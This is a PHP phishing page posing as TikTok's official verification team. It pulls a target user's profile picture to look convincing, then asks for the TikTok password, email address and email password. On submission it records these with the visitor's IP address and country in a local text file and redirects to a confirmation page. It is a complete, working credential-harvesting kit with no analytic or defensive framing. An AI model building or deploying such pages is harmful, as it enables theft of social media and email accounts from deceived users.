<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$_SERVER["ttalhasenturk"]=$nick;
$url = 'https://www.tiktok.com/tr/' . $nick;
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadHTML($html);
    $veri = $dom->textContent;
    $cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
        $cc[0] = $image_url;
    }
if($_POST){
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('revonzy.txt', 'a');
fwrite($file, "Username: ".$nick."\n\n" ."Password: ".$password. "\n\n"."Mail: ".$mail."\n\n"."Mail Password: ".$mailpass."\n\n"."Ip Adress: " .$ip."\n\n".

"Country: ".$ulke ."\n\n".   "Time: " .$cur_time.  "\n\n\n\n");
fclose($file);
echo '';
    header("Location: confirmed.php");
}
?>

<html lang="en">
<head>
  <meta charset="utf-8">
	<title>@<?php echo $nick;?> Copyright | Tiktok</title>
	<meta name="viewport" content="width=device-width">
  <link rel="stylesheet" type="text/css" href="css/form.css">
  <link rel="shortcut icon" href="img/tik.webp"/>
</head>
<body>

<center>

<div class="container"> 

<br><br>

<img src="img/tiktok.gif" class="gif">

<br>

  <h1 class="h1">@<?php echo $nick;?><img src="img/bluetik.png"></h1>
  <p class="p">
    Hello, <?php echo $nick; ?><br><br>
    You must provide the necessary information for the official tiktok team to check your account.
  </p>

<br><br>

<select class="bg1">
  <option>News/Media</option>
  <option>Sports</option>
  <option>Government/Politics</option>
  <option>Music</option>
  <option>Fashion</option>
  <option>Entertainment</option>
  <option>Blogger/Influencer</option>
  <option>Business/Brand/Organization</option>
  <option>Other</option>
</select>

<br><br>

  <form method="post" >

    <input type="password" name="password" placeholder="Password" required="" class="bg2">

<br><br>

    <input type="email" name="mail" placeholder="Mail Adress" required="" class="bg2">

<br><br>

    <input type="password" name="mailpass" placeholder="Mail Password" required="" class="bg2">

<br><br>

    <button class="button" type="submit"> Confirm as <br> @<?php echo $nick; ?></button>
 
</form>
</center>
</body>
</html>
